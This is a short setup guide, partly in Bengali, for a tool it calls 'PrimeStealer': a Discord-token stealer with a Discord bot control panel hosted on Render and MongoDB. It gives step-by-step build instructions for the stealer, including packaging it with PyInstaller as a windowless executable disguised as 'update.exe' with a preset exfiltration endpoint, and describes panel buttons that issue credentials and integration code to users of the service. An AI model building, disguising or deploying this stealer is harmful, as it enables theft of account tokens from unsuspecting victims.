# PrimeStealer — Setup Guide

## Files
- bot_main.py   → Discord bot (Render worker)
- stealer.py    → Token stealer (PyInstaller bundle)
- requirements.txt
- render.yaml
- .env.example

## Step 1 — MongoDB Atlas
1. atlas.mongodb.com → free cluster create করো
2. Database Access → user create (username + password)
3. Network Access → 0.0.0.0/0 allow
4. Connect → Drivers → connection string copy করো

## Step 2 — Discord Bot
1. discord.com/developers → New Application
2. Bot → Add Bot → Token copy করো
3. OAuth2 → URL Generator → scopes: bot, applications.commands
4. Bot Permissions: Send Messages, Read Messages, Use Slash Commands
5. Generated URL দিয়ে server এ add করো

## Step 3 — Render Deploy
1. GitHub repo তে push করো (bot_main.py, requirements.txt, render.yaml)
2. render.com → New Worker Service → repo connect
3. Environment Variables:
   - BOT_TOKEN = (Discord bot token)
   - MONGO_URI = (MongoDB connection string)
4. Deploy করো

## Step 4 — Stealer Build
1. pip install pyinstaller requests pywin32 pycryptodome psutil Pillow
2. stealer.py তে ENDPOINT already set আছে
3. pyinstaller --onefile --noconsole --name update stealer.py
4. dist/update.exe → ready

## Commands
- /app create  → নতুন app তৈরি
- /app manage  → app select → panel

## Panel Buttons
- Credentials  → endpoint + app_id + secret (ephemeral)
- Integration  → language select → code (ephemeral)
- Rotate       → secret rotate (confirmation)
- Rename       → app rename (modal)
- Delete       → app delete (confirmation)
- Webhook      → current webhook + set new (modal)
